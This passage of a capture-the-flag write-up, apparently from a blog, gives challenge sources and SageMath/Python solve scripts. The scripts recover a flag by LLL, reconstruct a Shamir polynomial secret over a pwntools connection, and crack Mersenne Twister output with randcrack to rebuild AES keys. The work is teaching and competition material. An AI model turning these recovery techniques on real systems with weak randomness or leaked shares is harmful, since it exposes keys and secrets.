style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">leak = <span class="number">0.930663173858708735013864574261632487708466528608503618563619854272677238694112204757817175383567864768566170130001514302467697072153084760545849543698249360760783987526742296036337216144968878436793442305949050751417113202760217838648422727760945579644861599148512584771382319668482598215317149996430</span></span><br><span class="line">acos = arccos(leak)</span><br><span class="line">RF = RealField(<span class="number">1000</span>)</span><br><span class="line"><span class="comment"># RealFieldRF53</span></span><br><span class="line">pi = RF(pi)</span><br><span class="line">M = Matrix(QQ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">800</span>],[<span class="number">0</span>,<span class="number">2</span>^<span class="number">376</span>,<span class="number">2</span>^<span class="number">800</span>*acos],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">800</span>*<span class="number">2</span>*pi]])</span><br><span class="line">m = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p><code>2**760</code></p><h3 id="shamir"><a class="markdownIt-Anchor" href="#shamir"></a> Shamir</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> __          __  _                            _______       _____ _                     _      </span></span><br><span class="line"><span class="string"> \ \        / / | |                          |__   __|     / ____| |                   (_)     </span></span><br><span class="line"><span class="string">  \ \  /\  / /__| | ___ ___  _ __ ___   ___     | | ___   | (___ | |__   __ _ _ __ ___  _ _ __ </span></span><br><span class="line"><span class="string">   \ \/  \/ / _ \ |/ __/ _ \| &#x27;_ ` _ \ / _ \    | |/ _ \   \___ \| &#x27;_ \ / _` | &#x27;_ ` _ \| | &#x27;__|</span></span><br><span class="line"><span class="string">    \  /\  /  __/ | (_| (_) | | | | | |  __/    | | (_) |  ____) | | | | (_| | | | | | | | |   </span></span><br><span class="line"><span class="string">     \/  \/ \___|_|\___\___/|_| |_| |_|\___|    |_|\___/  |_____/|_| |_|\__,_|_| |_| |_|_|_|   </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line"></span><br><span class="line">flag = getenv(<span class="string">&quot;GZCTF_FLAG&quot;</span>,<span class="string">&quot;GZCTF_NOT_DEFINE&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line">coefficients = [m] + [random.randrange(<span class="number">1</span>,n-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(coefficients)):</span><br><span class="line">        <span class="built_in">sum</span> += coefficients[i]*<span class="built_in">pow</span>(x,i,n) % n</span><br><span class="line">        <span class="built_in">sum</span> %= n</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please Input x: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Allowed!!!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    res = (x,f(x))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msub><mi>a</mi><mn>3</mn></msub><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>100</mn></msub><msup><mi>x</mi><mn>100</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">f(x)=flag+a_{1}x+a_{2}x^{2}+a_{3}x^{3}+...+a_{100}x^{100}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span></p><p><code>flag</code><code>x</code></p><p><code>Shamir</code><br /><a href="https://tangcuxiaojikuai.xyz/post/97bbcbc9.html"></a></p><blockquote><p>( t  t+1 ) 0  secret</p></blockquote><p>101<code>SageMath</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(host,port)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;n = &quot;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">PT = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;Please Input x:&quot;</span>,<span class="built_in">str</span>(i+<span class="number">1</span>).encode())</span><br><span class="line">    res = <span class="built_in">eval</span>(sh.recvline().decode())</span><br><span class="line">    PT.append(res)</span><br><span class="line">    </span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">recover_f = R.lagrange_polynomial(PT)</span><br><span class="line">m = recover_f(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h1 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h1><h2 id="crypto-4"><a class="markdownIt-Anchor" href="#crypto-4"></a> Crypto</h2><h3 id="mt19937"><a class="markdownIt-Anchor" href="#mt19937"></a> MT19937</h3><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> my_own_flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MT_19937</span>(<span class="params">num,en_c</span>):</span><br><span class="line">    seed1 = os.urandom(<span class="number">16</span>)</span><br><span class="line">    random.seed(seed1)</span><br><span class="line">    number = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        number.append(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">    cal = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num,num+en_c):</span><br><span class="line">        cal += random.getrandbits(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> number,cal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cal,flag</span>):</span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(cal).encode()).digest()</span><br><span class="line">    A = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    c = A.encrypt(pad(flag,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    LEN = <span class="built_in">len</span>(flag)</span><br><span class="line">    m1,m2 = flag[:LEN//<span class="number">2</span>],flag[LEN//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    Num = <span class="number">624</span></span><br><span class="line">    <span class="comment"># encrypt m1</span></span><br><span class="line">    K1 = MT_19937(Num,Num)</span><br><span class="line">    c1 = encrypt(K1[<span class="number">1</span>],m1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encrypt m1</span></span><br><span class="line">    K2 = MT_19937(Num, Num//<span class="number">4</span>)</span><br><span class="line">    c2 = encrypt(K2[<span class="number">1</span>], m2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(K1[<span class="number">0</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(K2[<span class="number">0</span>][:<span class="number">600</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(c1)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(c2)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">k1 = [<span class="number">1212937457</span>, <span class="number">714280275</span>, <span class="number">2934808054</span>, <span class="number">289447810</span>, <span class="number">634020656</span>, <span class="number">2582053193</span>, <span class="number">2648476152</span>, <span class="number">3584472561</span>, <span class="number">2877037797</span>, <span class="number">1051288028</span>, <span class="number">3007240724</span>, <span class="number">3583122714</span>, <span class="number">2377373219</span>, <span class="number">2233668169</span>, <span class="number">2300136290</span>, <span class="number">4277363949</span>, <span class="number">572508719</span>, <span class="number">3707687803</span>, <span class="number">868724505</span>, <span class="number">2234515288</span>, <span class="number">2182162330</span>, <span class="number">2354654192</span>, <span class="number">3676064525</span>, <span class="number">16386761</span>, <span class="number">1934246009</span>, <span class="number">396534601</span>, <span class="number">3406538372</span>, <span class="number">1978740790</span>, <span class="number">51554945</span>, <span class="number">1642830773</span>, <span class="number">3255471879</span>, <span class="number">249329746</span>, <span class="number">1871028531</span>, <span class="number">1670146144</span>, <span class="number">3955249559</span>, <span class="number">3523216280</span>, <span class="number">4225679888</span>, <span class="number">1979625069</span>, <span class="number">1711120506</span>, <span class="number">4224015378</span>, <span class="number">2357192253</span>, <span class="number">1437719734</span>, <span class="number">1861766583</span>, <span class="number">252037050</span>, <span class="number">3805173581</span>, <span class="number">3845899039</span>, <span class="number">239338040</span>, <span class="number">3335618070</span>, <span class="number">1909354144</span>, <span class="number">2380236080</span>, <span class="number">3120658839</span>, <span class="number">2738735651</span>, <span class="number">1749563272</span>, <span class="number">4028406006</span>, <span class="number">198730175</span>, <span class="number">4095736523</span>, <span class="number">2224365497</span>, <span class="number">1850797931</span>, <span class="number">123559677</span>, <span class="number">277130374</span>, <span class="number">1547602417</span>, <span class="number">2312967225</span>, <span class="number">1064405558</span>, <span class="number">620877831</span>, <span class="number">4182002366</span>, <span class="number">2717144120</span>, <span class="number">2424475877</span>, <span class="number">1261886189</span>, <span class="number">2666842961</span>, <span class="number">1250633055</span>, <span class="number">1445939400</span>, <span class="number">2496676732</span>, <span class="number">46718503</span>, <span class="number">1726056600</span>, <span class="number">2892333819</span>, <span class="number">3874613567</span>, <span class="number">2801764620</span>, <span class="number">3279121957</span>, <span class="number">62950328</span>, <span class="number">14090298</span>, <span class="number">3016963976</span>, <span class="number">235881318</span>, <span class="number">1152787765</span>, <span class="number">3549713637</span>, <span class="number">3184265794</span>, <span class="number">461262349</span>, <span class="number">1835258817</span>, <span class="number">706701716</span>, <span class="number">366259495</span>, <span class="number">2484440259</span>, <span class="number">2306336615</span>, <span class="number">2418024433</span>, <span class="number">107268664</span>, <span class="number">3018120752</span>, <span class="number">3915797798</span>, <span class="number">1685880034</span>, <span class="number">2782876985</span>, <span class="number">2876720582</span>, <span class="number">3803172243</span>, <span class="number">1745503879</span>, <span class="number">1965535595</span>, <span class="number">2831775453</span>, <span class="number">3139448870</span>, <span class="number">770826076</span>, <span class="number">559187920</span>, <span class="number">4292272948</span>, <span class="number">86904027</span>, <span class="number">1821662944</span>, <span class="number">58381562</span>, <span class="number">250790584</span>, <span class="number">2122997254</span>, <span class="number">2937312684</span>, <span class="number">3225034461</span>, <span class="number">1493971528</span>, <span class="number">913420791</span>, <span class="number">2911905254</span>, <span class="number">2938402784</span>, <span class="number">1430747115</span>, <span class="number">2654595902</span>, <span class="number">3315197237</span>, <span class="number">602765188</span>, <span class="number">1471009311</span>, <span class="number">3788529131</span>, <span class="number">913593424</span>, <span class="number">3280524381</span>, <span class="number">1554400422</span>, <span class="number">3250536147</span>, <span class="number">3480550436</span>, <span class="number">821401975</span>, <span class="number">3216026683</span>, <span class="number">762420368</span>, <span class="number">1733854366</span>, <span class="number">2395038075</span>, <span class="number">533527872</span>, <span class="number">3040490234</span>, <span class="number">2855012365</span>, <span class="number">2984904790</span>, <span class="number">2830464734</span>, <span class="number">2200935030</span>, <span class="number">523059886</span>, <span class="number">3795772367</span>, <span class="number">2905400361</span>, <span class="number">667720140</span>, <span class="number">3155311553</span>, <span class="number">1860651089</span>, <span class="number">1053555607</span>, <span class="number">2889478721</span>, <span class="number">1812821011</span>, <span class="number">3391980212</span>, <span class="number">3433665687</span>, <span class="number">2480476597</span>, <span class="number">1319654037</span>, <span class="number">1076583906</span>, <span class="number">2287201297</span>, <span class="number">966928688</span>, <span class="number">2542225146</span>, <span class="number">2246098689</span>, <span class="number">3117124345</span>, <span class="number">1844896511</span>, <span class="number">3104215564</span>, <span class="number">1303510082</span>, <span class="number">2924158615</span>, <span class="number">3648677443</span>, <span class="number">3308489255</span>, <span class="number">3809196505</span>, <span class="number">3199516268</span>, <span class="number">2254502655</span>, <span class="number">2126047470</span>, <span class="number">1763846642</span>, <span class="number">3851973930</span>, <span class="number">1280609700</span>, <span class="number">2415985988</span>, <span class="number">1312349771</span>, <span class="number">2103486452</span>, <span class="number">4229394974</span>, <span class="number">1937464844</span>, <span class="number">2763672456</span>, <span class="number">1366425769</span>, <span class="number">1532462738</span>, <span class="number">1864298394</span>, <span class="number">1203192658</span>, <span class="number">3679892306</span>, <span class="number">4138733297</span>, <span class="number">39437090</span>, <span class="number">1317880030</span>, <span class="number">132948638</span>, <span class="number">2315846286</span>, <span class="number">3394291148</span>, <span class="number">3207221552</span>, <span class="number">3834885856</span>, <span class="number">2367158425</span>, <span class="number">3183864791</span>, <span class="number">3303289072</span>, <span class="number">519407526</span>, <span class="number">4127464161</span>, <span class="number">1556426685</span>, <span class="number">2427155757</span>, <span class="number">2010011401</span>, <span class="number">2823249259</span>, <span class="number">3638339516</span>, <span class="number">2266010959</span>, <span class="number">345885116</span>, <span class="number">471672470</span>, <span class="number">2713191580</span>, <span class="number">731238671</span>, <span class="number">1694687550</span>, <span class="number">2523761501</span>, <span class="number">3533913138</span>, <span class="number">163820753</span>, <span class="number">1829608711</span>, <span class="number">587056408</span>, <span class="number">1129980234</span>, <span class="number">3642159144</span>, <span class="number">2546599527</span>, <span class="number">758703728</span>, <span class="number">1713442774</span>, <span class="number">1864598338</span>, <span class="number">2763096157</span>, <span class="number">2308766766</span>, <span class="number">1132350895</span>, <span class="number">2776604596</span>, <span class="number">1921085522</span>, <span class="number">1409581297</span>, <span class="number">2643399928</span>, <span class="number">3285649744</span>, <span class="number">1248611904</span>, <span class="number">2694186262</span>, <span class="number">2676127368</span>, <span class="number">2579578748</span>, <span class="number">3784393865</span>, <span class="number">2655293049</span>, <span class="number">1378866508</span>, <span class="number">1251610536</span>, <span class="number">1048557165</span>, <span class="number">3045231444</span>, <span class="number">4236456301</span>, <span class="number">2496231577</span>, <span class="number">4118010676</span>, <span class="number">3079411364</span>, <span class="number">2425576144</span>, <span class="number">2431718306</span>, <span class="number">543894373</span>, <span class="number">118186072</span>, <span class="number">2594647421</span>, <span class="number">1833894329</span>, <span class="number">3876640493</span>, <span class="number">1916631983</span>, <span class="number">2765860034</span>, <span class="number">3905895682</span>, <span class="number">2207230275</span>, <span class="number">2554838603</span>, <span class="number">3199831939</span>, <span class="number">2516271151</span>, <span class="number">3080023814</span>, <span class="number">3594335532</span>, <span class="number">1197450849</span>, <span class="number">2621744299</span>, <span class="number">447615180</span>, <span class="number">1616950869</span>, <span class="number">3109651542</span>, <span class="number">2553431350</span>, <span class="number">4165466937</span>, <span class="number">2130063794</span>, <span class="number">1459492895</span>, <span class="number">1141470511</span>, <span class="number">948009682</span>, <span class="number">325807524</span>, <span class="number">1681494454</span>, <span class="number">3137320840</span>, <span class="number">4219461371</span>, <span class="number">609761579</span>, <span class="number">942363481</span>, <span class="number">2404858793</span>, <span class="number">1697226342</span>, <span class="number">830264373</span>, <span class="number">230968933</span>, <span class="number">831865647</span>, <span class="number">4164463522</span>, <span class="number">2968510743</span>, <span class="number">1464271639</span>, <span class="number">1397831008</span>, <span class="number">2559413030</span>, <span class="number">3515044508</span>, <span class="number">772056268</span>, <span class="number">3152446673</span>, <span class="number">3117754594</span>, <span class="number">833212973</span>, <span class="number">4252629747</span>, <span class="number">2565179775</span>, <span class="number">3005093783</span>, <span class="number">3595030314</span>, <span class="number">4042182692</span>, <span class="number">298671165</span>, <span class="number">3183128227</span>, <span class="number">3429794312</span>, <span class="number">4122368172</span>, <span class="number">1900961662</span>, <span class="number">3589294443</span>, <span class="number">3190786481</span>, <span class="number">1744404482</span>, <span class="number">1921785452</span>, <span class="number">3011999869</span>, <span class="number">642164068</span>, <span class="number">3695788414</span>, <span class="number">2275346981</span>, <span class="number">1428956574</span>, <span class="number">2697326707</span>, <span class="number">2202213004</span>, <span class="number">3287889517</span>, <span class="number">919861723</span>, <span class="number">726410498</span>, <span class="number">337174656</span>,</span><br><span class="line">      <span class="number">2417998504</span>, <span class="number">2752587611</span>, <span class="number">3856581958</span>, <span class="number">141509063</span>, <span class="number">1762431188</span>, <span class="number">2065705145</span>, <span class="number">2031960873</span>, <span class="number">1892209091</span>, <span class="number">2395039500</span>, <span class="number">1058479586</span>, <span class="number">1537034270</span>, <span class="number">502217054</span>, <span class="number">3102018820</span>, <span class="number">1433274316</span>, <span class="number">1372952271</span>, <span class="number">2918921770</span>, <span class="number">239909451</span>, <span class="number">1398298200</span>, <span class="number">2339489735</span>, <span class="number">372558373</span>, <span class="number">2263872236</span>, <span class="number">2426192905</span>, <span class="number">337209508</span>, <span class="number">3983991978</span>, <span class="number">2574803724</span>, <span class="number">2837664572</span>, <span class="number">1569892789</span>, <span class="number">2625063195</span>, <span class="number">3262762020</span>, <span class="number">24150029</span>, <span class="number">2016099290</span>, <span class="number">2239153990</span>, <span class="number">85602273</span>, <span class="number">973040529</span>, <span class="number">2956276779</span>, <span class="number">4218049523</span>, <span class="number">2043716624</span>, <span class="number">2788573458</span>, <span class="number">1218787308</span>, <span class="number">939708241</span>, <span class="number">2861205992</span>, <span class="number">2427634523</span>, <span class="number">4128874493</span>, <span class="number">2326852266</span>, <span class="number">2593724377</span>, <span class="number">1680473968</span>, <span class="number">2763572707</span>, <span class="number">4240616686</span>, <span class="number">2863701585</span>, <span class="number">3551633590</span>, <span class="number">1765256405</span>, <span class="number">2110583291</span>, <span class="number">357590304</span>, <span class="number">2511138801</span>, <span class="number">859903599</span>, <span class="number">35591840</span>, <span class="number">3786321031</span>, <span class="number">3559501147</span>, <span class="number">3107666783</span>, <span class="number">2356867678</span>, <span class="number">1369801910</span>, <span class="number">2488594855</span>, <span class="number">2148205170</span>, <span class="number">3944224524</span>, <span class="number">2219844222</span>, <span class="number">466009157</span>, <span class="number">2328231114</span>, <span class="number">2777059464</span>, <span class="number">1585865212</span>, <span class="number">2871297568</span>, <span class="number">2558165993</span>, <span class="number">1561563095</span>, <span class="number">438633926</span>, <span class="number">2619385032</span>, <span class="number">2185942244</span>, <span class="number">2501145168</span>, <span class="number">2161107203</span>, <span class="number">912485991</span>, <span class="number">3956413626</span>, <span class="number">4065963551</span>, <span class="number">1527306118</span>, <span class="number">378382496</span>, <span class="number">1016367697</span>, <span class="number">82832444</span>, <span class="number">2484726280</span>, <span class="number">867566307</span>, <span class="number">1037338825</span>, <span class="number">4291735272</span>, <span class="number">901722138</span>, <span class="number">3956112428</span>, <span class="number">1060890097</span>, <span class="number">4210262544</span>, <span class="number">2525835262</span>, <span class="number">786274933</span>, <span 